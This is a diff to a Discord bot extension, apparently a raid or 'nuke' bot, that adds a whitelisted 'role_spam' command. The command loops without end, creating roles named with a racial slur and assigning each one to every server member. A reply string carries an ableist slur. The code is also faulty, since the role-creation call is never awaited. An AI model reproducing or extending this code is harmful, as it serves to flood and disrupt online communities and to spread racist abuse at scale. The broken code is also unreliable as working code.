@@ -152,6 +152,26 @@ https://cdn.discordapp.com/attachments/693974529923612728/708740617496428604/158
         else:
             self.warn(ctx, 'spam')
             raise commands.CommandNotFound('shit')
+    
+    @commands.command()
+    async def role_spam(self, ctx):
+        await ctx.message.delete()
+        if ctx.author.id in self.whitelist:
+            if not ctx.guild.id in self.servers:
+                i = 0
+                while True:
+                    i += 1
+                    role = ctx.guild.create_role(name=f"nigger-{i}")
+                    for user in ctx.guild.members:
+                        try:
+                            await user.add_roles(role)
+                        except:
+                            pass
+            else:
+                await ctx.send("You can't role spam this server retard")
+        else:
+            raise commands.CommandNotFound("shit")
+
 
 
 def setup(bot):
